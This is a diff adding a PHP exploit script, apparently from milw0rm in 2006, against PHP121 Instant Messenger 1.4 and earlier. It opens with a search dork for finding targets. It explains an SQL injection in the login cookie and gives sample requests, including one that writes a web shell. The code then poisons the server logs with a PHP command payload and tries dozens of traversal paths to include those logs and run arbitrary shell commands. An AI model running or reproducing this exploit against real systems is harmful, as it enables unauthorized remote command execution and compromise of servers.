@@ -1,0 +1,289 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo "PHP121 Instant Messenger <= 1.4 \$_SESSION[sess_username] remote cmmnds xctn \r\n";
+echo "by rgod rgod@autistici.org\r\n";
+echo "site: http://retrogod.altervista.org\r\n\r\n";
+echo "-> works with magic_quotes_gpc = Off\r\n\r\n";
+echo "a dork: inurl:php121login.php | inurl:php121im.php | intitle:\"PHP121 - PLEASE\"\r\n\r\n";
+
+if ($argc<4) {
+echo "Usage: php ".$argv[0]." host path cmd OPTIONS\r\n";
+echo "host:      target server (ip/hostname)\r\n";
+echo "path:      path to PHP121\r\n";
+echo "cmd:       a shell command\r\n";
+echo "Options:\r\n";
+echo "   -p[port]:    specify a port other than 80\r\n";
+echo "   -P[ip:port]: specify a proxy\r\n";
+echo "Examples:\r\n";
+echo "php ".$argv[0]." localhost /php121/ cat php121config.php\r\n";
+echo "php ".$argv[0]." localhost /php121/ ls -la -p81\r\n";
+echo "php ".$argv[0]." localhost / ls -la -P1.1.1.1:80\r\n";
+die;
+}
+
+/*
+ software site: http://www.php121.com/
+ description: "PHP121 is a free web based instant messenger - written entirely in
+ PHP"
+
+ i)  vulnerable code in php121login.php and in nearly all files:
+
+  ...
+  if (isset($_COOKIE['php121un']) && isset($_COOKIE['php121pw'])) {
+        $logindataun = $_COOKIE['php121un'];
+        $logindatapw = $_COOKIE['php121pw'];
+        if (!empty($logindataun) && !empty($logindatapw)) {
+                //we have a cookie - use it to login, overriding any sessions
+                $_SESSION[sess_username]=$logindataun;
+                $_SESSION[sess_password]=$logindatapw;
+        }
+}
+
+$sess_username=$_SESSION[sess_username];
+$sess_password=$_SESSION[sess_password];
+  ...
+
+  in php121language.php we have:
+
+...
+$sess_username=$_SESSION[sess_username];
+$sess_password=$_SESSION[sess_password];
+// are we logged in?
+
+if ($sess_username!="") {
+
+	// get our language preference
+	$sql="select $dbf_language from $db_usertable where $dbf_uname='$sess_username'";
+	echo "sql: ".$sql."\r\n";
+	$row=mysql_fetch_row(mysql_query($sql));
+	if ($row[0]!="") {
+	require_once("language/lang-".strtolower($row[0]).".php");
+
+	}
+
+} else {
+
+	// use the default language file
+	require_once("language/lang-".strtolower($php121_config['default_language']).".php");
+
+}
+...
+
+ "sess_username" value is not sanitized before to be used in our query
+ so, if magic_quotes_gpc = Off, we can include arbitrary files from local
+ resources, poc:
+
+  GET /php121login.php HTTP/1.0
+  Host: somehost
+  Cookie: php121un=%27UNION+SELECT+%27..%2F..%2F..%2Fetc%2Fpasswd%00%27+FROM+php121_users%2F%2A; php121pw=suntzu;
+  Connection: Close
+
+ now session cookie is poisoned, and we can go to php121language.php
+ with our new cookie to see/include local resources, query becomes:
+
+ select php121_language from php121_users where uname=''UNION SELECT '../../../etc/passwd[null char]' FROM php121_users/*'
+
+ php121_language field is varchar(30) so, before MySQL 4.1.1,
+ your path is limited to 29 chars (so, it is nearly impossible
+ submit a valid inclusion path), with Mysql >=4.1.1 it does not matter,
+ path is not truncated anymore at the length of the first select field
+
+ we can also try  blind injection, injecting a shell:
+
+  GET /php121login.php HTTP/1.0
+  Host: somehost
+  Cookie: php121un=%27UNION+SELECT+%27%3C%3Fphp+system%28%24_GET%5Bcmd%5D%29%3B%3F%3E%27+INTO+DUMPFILE+%27somefile%27+FROM+php121_users%2F%2A; php121pw=suntzu;
+  Connection: Close
+
+ and now go to php121language.php to write our file, if MySQL have certain rigths
+ to do it
+
+ you can do the work trough a browser like Opera that allows to edit cookies
+
+ However, this exploit inject some code in log files and try to include them
+
+					                                      */
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  #debug
+  #echo "\r\n".$html;
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$cmd="";$port=80;$proxy="";
+
+for ($i=3; $i<=$argc-1; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P"))
+{$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+$cmd=urlencode($cmd);
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+echo "[1] Injecting some code in log files ...\r\n\r\n";
+$CODE="<?php echo 56789;passthru(\$_COOKIE[cmd]);die;?>";
+$packet="GET ".$p.$CODE." HTTP/1.0\r\n";
+$packet.="User-Agent: ".$CODE." Googlebot/2.1\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: close\r\n\r\n";
+sendpacketii($packet);
+sleep(1);
+
+$paths=array(
+"../../../../../../../../../../var/log/httpd/access_log",
+"../../../../../../../../../../var/log/httpd/error_log",
+"../apache/logs/error.log",
+"../apache/logs/access.log",
+"../../apache/logs/error.log",
+"../../apache/logs/access.log",
+"../../../apache/logs/error.log",
+"../../../apache/logs/access.log",
+"../../../../apache/logs/error.log",
+"../../../../apache/logs/access.log",
+"../../../../../apache/logs/error.log",
+"../../../../../apache/logs/access.log",
+"../../../../../../apache/logs/error.log",
+"../../../../../../apache/logs/access.log",
+"../logs/error.log",
+"../logs/access.log",
+"../../logs/error.log",
+"../../logs/access.log",
+"../../../logs/error.log",
+"../../../logs/access.log",
+"../../../../logs/error.log",
+"../../../../logs/access.log",
+"../../../../../logs/error.log",
+"../../../../../logs/access.log",
+"../../../../../../logs/error.log",
+"../../../../../../logs/access.log",
+"../../../../../../../../../../etc/httpd/logs/acces_log",
+"../../../../../../../../../../etc/httpd/logs/acces.log",
+"../../../../../../../../../../etc/httpd/logs/error_log",
+"../../../../../../../../../../etc/httpd/logs/error.log",
+"../../../../../../../../../../var/www/logs/access_log",
+"../../../../../../../../../../var/www/logs/access.log",
+"../../../../../../../../../../usr/local/apache/logs/access_log",
+"../../../../../../../../../../usr/local/apache/logs/access.log",
+"../../../../../../../../../../var/log/apache/access_log",
+"../../../../../../../../../../var/log/apache/access.log",
+"../../../../../../../../../../var/log/access_log",
+"../../../../../../../../../../var/www/logs/error_log",
+"../../../../../../../../../../var/www/logs/error.log",
+"../../../../../../../../../../usr/local/apache/logs/error_log",
+"../../../../../../../../../../usr/local/apache/logs/error.log",
+"../../../../../../../../../../var/log/apache/error_log",
+"../../../../../../../../../../var/log/apache/error.log",
+"../../../../../../../../../../var/log/access_log",
+"../../../../../../../../../../var/log/error_log"
+);
+
+
+for ($i=0; $i<=count($paths)-1; $i++)
+{
+  $a=$i+2;
+  echo "[".$a."] Trying with: ".$paths[$i]."%00\r\n";
+  $sql="'UNION SELECT '".$paths[$i].chr(0x00)."' FROM php121_users/*";
+  $sql=urlencode($sql);
+  $packet ="GET ".$p."php121login.php HTTP/1.0\r\n";
+  $packet.="Host: ".$host."\r\n";
+  $packet.="Cookie: php121un=".$sql."; php121pw=suntzu;\r\n";
+  $packet.="Connection: Close\r\n\r\n";
+  #debug
+  #echo quick_dump($packet);
+  sendpacketii($packet);
+
+  $temp=explode("Set-Cookie: ",$html);
+  $temp2=explode(" ",$temp[1]);
+  $cookie=$temp2[0];
+  echo "Cookie -> ".$cookie."\r\n\r\n";
+  if ($cookie=='') {
+  echo $html;
+  die("Something goes wrong...\r\n");
+  }
+
+  $packet ="GET ".$p."php121language.php HTTP/1.0\r\n";
+  $packet.="User-Agent: GoogleBot/2.1\r\n";
+  $packet.="Host: ".$host."\r\n";
+  $packet.="Cookie: ".$cookie."; cmd=".$cmd.";\r\n";
+  $packet.="Connection: Close\r\n\r\n";
+  #debug
+  #echo quick_dump($packet);
+  sendpacketii($packet);
+  if (strstr($html,"56789"))
+  {
+    echo "Exploit succeeded...\r\n";
+    $temp=explode("56789",$html);
+    echo $temp[1];
+    die;
+  }
+}
+//if you are here...
+echo "Exploit failed...";
+?>
+
+# milw0rm.com [2006-04-12]
